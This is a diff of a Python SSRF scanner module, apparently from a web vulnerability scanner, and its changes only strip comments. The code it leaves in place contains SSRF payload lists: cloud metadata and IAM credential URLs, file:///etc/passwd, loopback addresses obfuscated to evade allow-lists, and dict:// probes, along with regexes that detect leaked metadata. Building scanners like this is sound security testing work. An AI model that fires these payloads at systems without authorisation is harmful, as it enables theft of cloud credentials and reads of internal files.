@@ -71,7 +71,7 @@ except ImportError:
     _HAS_TIMING_ORACLE = False
 
 
-# ── Parameter surface heuristics ──────────────────────────────────────────────
+
 
 _URL_PARAM_NAME_RE = re.compile(
     r"(url|uri|link|href|src|source|target|dest|destination|redirect|"
@@ -83,9 +83,9 @@ _URL_PARAM_NAME_RE = re.compile(
 )
 _URL_VALUE_RE = re.compile(r"^(https?:)?//", re.IGNORECASE)
 
-# Path segments that indicate a URL-fetching *feature* exists even if the
-# discovered parameter name doesn't match the heuristic above (e.g. a
-# screenshot service might take a param called just "u" or "target[0]").
+
+
+
 _SSRF_FEATURE_PATH_RE = re.compile(
     r"/(webhook|callback|notify|proxy|fetch|import|unfurl|preview|"
     r"screenshot|render|pdf|thumbnail|avatar|image[_-]?upload|"
@@ -94,7 +94,7 @@ _SSRF_FEATURE_PATH_RE = re.compile(
     re.IGNORECASE,
 )
 
-# ── Cloud metadata signatures (Tier 1) ────────────────────────────────────────
+
 
 _METADATA_SIGNATURES = [
     (re.compile(r"ami-id|instance-id|iam/security-credentials", re.IGNORECASE), "AWS EC2 instance metadata"),
@@ -109,12 +109,12 @@ _METADATA_SIGNATURES = [
     (re.compile(r"root:.*:0:0:", re.IGNORECASE), "/etc/passwd contents (file:// read)"),
 ]
 
-# Tier 1 payloads: (label, url, extra_headers_hint)
-# extra_headers_hint documents which header a *vulnerable server's own
-# outbound request* would need for the metadata service to answer — we
-# cannot set that header ourselves (the request happens server-side), it's
-# recorded purely so the PoC/report explains why GCP/Azure sometimes need a
-# second finding (a header-injection bug) chained with the SSRF to work.
+
+
+
+
+
+
 _METADATA_PAYLOADS = [
     ("aws_latest",      "http://169.254.169.254/latest/meta-data/", None),
     ("aws_iam_creds",   "http://169.254.169.254/latest/meta-data/iam/security-credentials/", None),
@@ -127,17 +127,17 @@ _METADATA_PAYLOADS = [
     ("file_etc_passwd", "file:///etc/passwd", None),
 ]
 
-# Tier 2 payloads: obfuscated ways of saying "127.0.0.1" / internal ranges,
-# designed to slip past naive string-equality or substring allow-lists.
+
+
 _INTERNAL_PAYLOADS = [
     ("loopback_plain",     "http://127.0.0.1/"),
     ("loopback_localhost", "http://localhost/"),
-    ("loopback_decimal",   "http://2130706433/"),          # 127.0.0.1 as a 32-bit decimal
-    ("loopback_octal",     "http://0177.0000.0000.0001/"),  # 127.0.0.1 in octal
-    ("loopback_hex",       "http://0x7f.0x0.0x0.0x1/"),      # 127.0.0.1 in hex
+    ("loopback_decimal",   "http://2130706433/"),          
+    ("loopback_octal",     "http://0177.0000.0000.0001/"),  
+    ("loopback_hex",       "http://0x7f.0x0.0x0.0x1/"),      
     ("loopback_ipv6",      "http://[::1]/"),
     ("loopback_ipv6_mapped", "http://[::ffff:127.0.0.1]/"),
-    ("link_local_aws",     "http://169.254.169.254/"),      # bare, no known path
+    ("link_local_aws",     "http://169.254.169.254/"),      
     ("rfc1918_10",         "http://10.0.0.1/"),
     ("rfc1918_172",        "http://172.16.0.1/"),
     ("rfc1918_192",        "http://192.168.0.1/"),
@@ -150,7 +150,7 @@ _PROTOCOL_PAYLOADS = [
     ("scheme_dict",   "dict://127.0.0.1:11211/stats"),
 ]
 
-_MAX_PARAMS_PER_ENDPOINT = 4   # cap request volume: don't fuzz every field of a huge JSON body
+_MAX_PARAMS_PER_ENDPOINT = 4   
 
 
 class SSRFScanner:
@@ -165,12 +165,12 @@ class SSRFScanner:
         self._scanner = scanner
         self._config = scanner.config
         self._request = scanner._request
-        self._reported: set[tuple] = set()          # (host, param, tier)
+        self._reported: set[tuple] = set()          
         self._timing_oracle = TimingOracle(scanner) if _HAS_TIMING_ORACLE else None
         self._oob_domain = getattr(self._config, "ssrf_oob_domain", "") or ""
-        self._oob_checker = getattr(self._config, "ssrf_oob_checker", None)  # optional async callable(nonce) -> bool
+        self._oob_checker = getattr(self._config, "ssrf_oob_checker", None)  
 
-    # ── Public API ───────────────────────────────────────────────────────────
+
 
     async def check(
         self,
@@ -194,16 +194,16 @@ class SSRFScanner:
         for location, param_path, current_value in candidates[:_MAX_PARAMS_PER_ENDPOINT]:
             dedup_base = (host, param_path)
 
-            # Tier 1 — in-band cloud metadata confirmation
+
             key1 = dedup_base + ("metadata",)
             if key1 not in self._reported:
                 f = await self._probe_metadata(url, method, location, param_path, params, body, host)
                 if f:
                     self._reported.add(key1)
                     findings.append(f)
-                    continue  # confirmed critical — no need to also run the blind tiers on this param
+                    continue  
 
-            # Tier 3 — OOB confirmation (only if operator configured a collaborator domain)
+
             key3 = dedup_base + ("oob",)
             if self._oob_domain and key3 not in self._reported:
                 f = await self._probe_oob(url, method, location, param_path, params, body, host)
@@ -212,7 +212,7 @@ class SSRFScanner:
                     findings.append(f)
                     continue
 
-            # Tier 2 — internal-network differential leads (blind, capped confidence)
+
             key2 = dedup_base + ("internal",)
             if key2 not in self._reported:
                 f = await self._probe_internal(url, method, location, param_path, params, body, host, base_body)
@@ -222,7 +222,7 @@ class SSRFScanner:
 
         return findings
 
-    # ── Parameter discovery ─────────────────────────────────────────────────
+
 
     def _find_candidate_params(self, url: str, params: dict, body: dict) -> list[tuple]:
         """
@@ -249,10 +249,10 @@ class SSRFScanner:
         walk(params, "", "query")
         walk(body, "", "body")
 
-        # Path-based feature heuristic: if no named candidate but the path
-        # itself smells like a URL-fetching feature, still worth a probe
-        # against whichever single string-valued field exists (best-effort;
-        # real target field may be named unpredictably).
+
+
+
+
         if not candidates and _SSRF_FEATURE_PATH_RE.search(urlparse(url).path):
             for location, obj in (("query", params), ("body", body)):
                 if isinstance(obj, dict):
@@ -263,7 +263,7 @@ class SSRFScanner:
 
         return candidates
 
-    # ── Tier 1: metadata confirmation ───────────────────────────────────────
+
 
     async def _probe_metadata(
         self, url, method, location, param_path, params, body, host,
@@ -291,7 +291,7 @@ class SSRFScanner:
                     )
         return None
 
-    # ── Tier 2: internal network differential ──────────────────────────────
+
 
     async def _probe_internal(
         self, url, method, location, param_path, params, body, host, base_body,
@@ -299,10 +299,10 @@ class SSRFScanner:
         if not self._timing_oracle:
             return None
 
-        # Negative control: a random subdomain of a non-existent TLD. Any
-        # sane network stack fails this the same way every time (NXDOMAIN /
-        # connection refused), which is our "definitely didn't reach
-        # anything" baseline for the timing comparison.
+
+
+
+
         control_host = f"{self._nonce()}.invalid-{self._nonce(4)}.test"
         control_url = f"http://{control_host}/"
 
@@ -320,7 +320,7 @@ class SSRFScanner:
                     request_a=req_control,
                     request_b=req_internal,
                     description=f"SSRF blind probe: control vs {label}",
-                    samples=4,          # keep it cheap — this runs per-param, per-payload
+                    samples=4,          
                     interleave=True,
                 )
             except Exception as e:
@@ -341,7 +341,7 @@ class SSRFScanner:
             host, best_result,
         )
 
-    # ── Tier 3: OOB confirmation ─────────────────────────────────────────────
+
 
     async def _probe_oob(
         self, url, method, location, param_path, params, body, host,
@@ -372,15 +372,15 @@ class SSRFScanner:
         if interacted:
             return self._build_oob_finding(url, method, param_path, payload_url, host, confirmed=True)
 
-        # No pluggable checker wired up (or no hit yet) — still surface the
-        # attempt as a low-confidence, unconfirmed lead so the operator
-        # knows to check their collaborator/interactsh logs for this nonce
-        # manually, rather than silently dropping the test entirely.
+
+
+
+
         if not self._oob_checker:
             return self._build_oob_finding(url, method, param_path, payload_url, host, confirmed=False)
         return None
 
-    # ── Tier 4: protocol/scheme acceptance (contextual only) ────────────────
+
 
     async def _protocol_acceptance_note(
         self, method, url, location, param_path, params, body,
@@ -404,7 +404,7 @@ class SSRFScanner:
             )
         return ""
 
-    # ── Request helper ───────────────────────────────────────────────────────
+
 
     async def _send_with_param(
         self, method, url, location, param_path, payload_value, params, body,
@@ -457,7 +457,7 @@ class SSRFScanner:
     def _nonce(self, n: int = 8) -> str:
         return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))
 
-    # ── Finding builders ─────────────────────────────────────────────────────
+
 
     def _build_metadata_finding(
         self, url, method, param_path, payload_url, label, sig_name,
@@ -650,7 +650,7 @@ class SSRFScanner:
         )
         return finding
 
-    # ── PoC helpers ──────────────────────────────────────────────────────────
+
 
     def _curl(self, url, method, param_path, payload_url) -> str:
         return (
